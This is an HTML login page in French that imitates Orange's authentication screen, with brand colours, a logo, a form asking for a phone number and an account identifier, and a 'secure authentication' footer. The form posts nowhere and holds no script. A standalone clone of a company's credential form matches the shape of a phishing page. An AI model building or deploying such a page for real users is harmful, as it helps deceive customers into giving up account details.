<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification - Orange</title>
    <style>
        body {
            margin: 0;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000;
            /* fond noir */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #111;
            /* gris foncé */
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            width: 350px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px;
        }

        h2 {
            color: #FF6600;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            color: #fff;
            font-size: 14px;
            margin-bottom: 6px;
            display: block;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #333;
            background-color: #222;
            color: #fff;
            font-size: 15px;
        }

        .input-group input:focus {
            outline: none;
            border: 1px solid #FF6600;
            box-shadow: 0 0 6px #FF6600;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #FF6600;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .login-btn:hover {
            background-color: #e65c00;
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="logo">
            <img src="logo2.png" alt="Logo Orange">
        </div>
        <h2>Connexion</h2>
        <form>
            <div class="input-group">
                <label for="numero">Numéro</label>
                <input type="text" id="numero" name="numero" placeholder="Entrez votre numéro" required>
            </div>
            <div class="input-group">
                <label for="identifiant">Identifiant</label>
                <input type="text" id="identifiant" name="identifiant" placeholder="Entrez votre identifiant" required>
            </div>
            <button type="submit" class="login-btn">Se connecter</button>
        </form>
        <div class="footer-text">© Orange 2025 - Authentification sécurisée</div>
    </div>
</body>

</html>
